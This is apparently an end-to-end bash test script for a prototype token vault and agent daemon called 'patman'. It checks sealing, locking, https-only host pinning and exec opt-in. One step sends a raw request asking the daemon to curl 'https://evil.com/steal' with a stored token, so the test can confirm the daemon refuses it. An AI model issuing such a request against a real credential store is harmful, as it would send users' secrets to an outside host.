#!/usr/bin/env bash
# End-to-end exercise of the sealed-file + unlock-session prototype.
set -uo pipefail

SCRATCH="$(cd "$(dirname "$0")" && pwd)"
PATMAN="${PATMAN:-$SCRATCH/../../target/debug/patman}"
PTY="python3 $SCRATCH/ptyrun.py"

export HOME="/tmp/pm-e2e"
rm -rf "$HOME"; mkdir -p "$HOME"

PASS="correct-horse-battery"
TOKEN="ghp_TESTTOKEN_abc123_DO_NOT_SHIP"

step() { printf '\n\033[1m=== %s ===\033[0m\n' "$*"; }
ok()   { printf '  \033[32mPASS\033[0m %s\n' "$*"; }
bad()  { printf '  \033[31mFAIL\033[0m %s\n' "$*"; FAILED=1; }
FAILED=0

step "1. init + save a token (plaintext install)"
"$PATMAN" init >/dev/null
printf '%s' "$TOKEN" | "$PATMAN" save github --stdin -d "test token" --host api.github.com >/dev/null
# A second service with no pinned hosts, so the local http echo server is reachable.
# (With hosts pinned, patman restricts curl to https — correctly refusing cleartext.)
printf '%s' "$TOKEN" | "$PATMAN" save localecho --stdin -d "local echo test" >/dev/null 2>&1
if grep -qF "$TOKEN" "$HOME/.pat/github"; then
  ok "token is plaintext on disk, as today"
else
  bad "expected plaintext"
fi

step "2. vault init"
$PTY "passphrase (input hidden)=$PASS||Repeat it=$PASS" "$PATMAN" vault init | tail -4

step "3. vault seal"
$PTY "passphrase (input hidden)=$PASS" "$PATMAN" vault seal | tail -3
if grep -qF "$TOKEN" "$HOME/.pat/github"; then
  bad "TOKEN STILL READABLE ON DISK"
else
  ok "token no longer appears in the file"
fi
head -c 8 "$HOME/.pat/github" | xxd | sed 's/^/  /'

step "4. locked + no TTY: the agent-driven path must fail"
out=$("$PATMAN" curl github -- -sS http://127.0.0.1:9/ 2>&1)
if grep -q "patman unlock" <<<"$out"; then
  ok "refused with instructions: $(tr '\n' ' ' <<<"$out" | cut -c1-90)..."
else
  bad "expected a locked refusal, got: $out"
fi

step "5. locked: metadata is still readable without a passphrase"
"$PATMAN" list | sed 's/^/  /'
"$PATMAN" status | sed 's/^/  /'

step "6. start the echo server"
python3 - <<'PY' &
import http.server, json
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        body = json.dumps({"authorization": self.headers.get("Authorization", "")}).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)
    def log_message(self, *a): pass
http.server.HTTPServer(("127.0.0.1", 8731), H).serve_forever()
PY
SERVER=$!
sleep 1

step "7. unlock"
$PTY "passphrase (input hidden)=$PASS" "$PATMAN" unlock --minutes 5 | tail -3
"$PATMAN" status | sed 's/^/  /'

step "8. curl through the agent (no passphrase, no TTY)"
out=$("$PATMAN" curl localecho -- -sS http://127.0.0.1:8731/api 2>/dev/null)
echo "  server saw: $out"
if grep -qF "Bearer $TOKEN" <<<"$out"; then
  ok "the real token reached curl"
else
  bad "token did not arrive: $out"
fi

step "9. a pinned service refuses cleartext, through the agent"
out=$("$PATMAN" curl github -- -sS http://127.0.0.1:8731/api 2>&1)
if grep -q "not https" <<<"$out"; then
  ok "cleartext refused for a pinned service: $(head -1 <<<"$out" | cut -c1-70)..."
else
  bad "expected an https refusal, got: $out"
fi

step "10. exec is refused until opted in"
out=$("$PATMAN" exec localecho -- sh -c 'echo $PAT_TOKEN' 2>&1)
if grep -q "not enabled" <<<"$out"; then
  ok "exec refused: $(head -1 <<<"$out")"
else
  bad "exec should have been refused, got: $out"
fi

"$PATMAN" describe localecho --allow-exec >/dev/null
out=$("$PATMAN" exec localecho -- sh -c 'echo $PAT_TOKEN' 2>&1)
if grep -qF "$TOKEN" <<<"$out"; then
  ok "after --allow-exec, exec works (and hands over the token, as documented)"
else
  bad "exec should work after opt-in, got: $out"
fi

step "11. host pinning is enforced BY THE DAEMON, not the client"
echo "  pinned host is 127.0.0.1; a raw protocol client asks for evil.com"
python3 - <<'PY'
import json, os, socket, struct
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect(os.path.expanduser("~/.pat/agent.sock"))
req = {"op": "curl", "service": "github", "auth": "auto",
       "args": ["-sS", "https://evil.com/steal"]}
s.sendall((json.dumps(req) + "\n").encode())
buf = b""
while True:
    hdr = s.recv(5)
    if len(hdr) < 5: break
    kind = hdr[0]; ln = struct.unpack(">I", hdr[1:5])[0]
    payload = b""
    while len(payload) < ln:
        payload += s.recv(ln - len(payload))
    if kind == 4:
        print("  DAEMON REFUSED:", payload.decode().replace("\n", " ")[:120]); break
    if kind == 3:
        print("  daemon allowed it — exit", struct.unpack(">i", payload)[0]); break
PY

step "12. a raw client cannot ask for the token itself"
python3 - <<'PY'
import json, os, socket, struct
for op in ({"op":"read","service":"github"}, {"op":"show","service":"github"}):
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.connect(os.path.expanduser("~/.pat/agent.sock"))
    s.sendall((json.dumps(op) + "\n").encode())
    hdr = s.recv(5)
    ln = struct.unpack(">I", hdr[1:5])[0]
    payload = s.recv(ln)
    print(f"  {op['op']!r:8} -> {payload.decode()[:70]}")
    s.close()
PY

step "13. lock, then try again"
"$PATMAN" lock | sed 's/^/  /'
sleep 0.3
out=$("$PATMAN" curl localecho -- -sS http://127.0.0.1:8731/api 2>&1)
if grep -q "patman unlock" <<<"$out"; then
  ok "locked again; curl refuses"
else
  bad "expected a locked refusal, got: $out"
fi
if [ -S "$HOME/.pat/agent.sock" ]; then bad "socket left behind"; else ok "socket cleaned up"; fi

step "14. permissions"
ls -la "$HOME/.pat" | sed 's/^/  /'

kill $SERVER 2>/dev/null
pkill -f 'patman agent-serve' 2>/dev/null
printf '\n'
if [ "$FAILED" = 1 ]; then printf '\033[31mSOME CHECKS FAILED\033[0m\n'; else printf '\033[32mALL CHECKS PASSED\033[0m\n'; fi
